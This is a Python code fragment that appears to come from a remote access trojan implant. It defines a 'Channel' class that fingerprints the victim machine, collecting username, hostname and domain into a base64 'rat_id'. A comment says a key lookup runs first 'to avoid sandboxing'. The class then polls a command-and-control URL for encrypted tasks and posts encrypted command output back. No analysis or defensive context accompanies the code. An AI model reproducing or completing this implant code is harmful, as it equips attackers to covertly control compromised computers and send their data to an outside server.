class Channel:
	def initalization():		
		global station
		global user
		global rat_id 
		imp_id = '{{IMP_ID}}'
		user = os.getlogin() #username is need for envkey()
		print(user)
		station = envkey() #run envkey() before any other code to avoid sandboxing
		station = station.decode()
		host = socket.gethostname()
		dom = socket.getfqdn()
		print(host)
		print(dom)
		rand = ''.join([chr(97 + random.randint(0, 25)) for i in range(5)])
		rat_id = base64.b64encode((rand+':'+imp_id+':'+user+':'+host+':'+dom).encode('ascii'))
		rat_id = rat_id.decode('ascii')

	def get_task():
		global station
		get_request = requests.get(station+'?id='+rat_id)
		get_response = get_request.text
		return Crypto.dec(get_response)

	def task_io(output):
		global station
		post_request = requests.post(station, data = Crypto.enc(output))
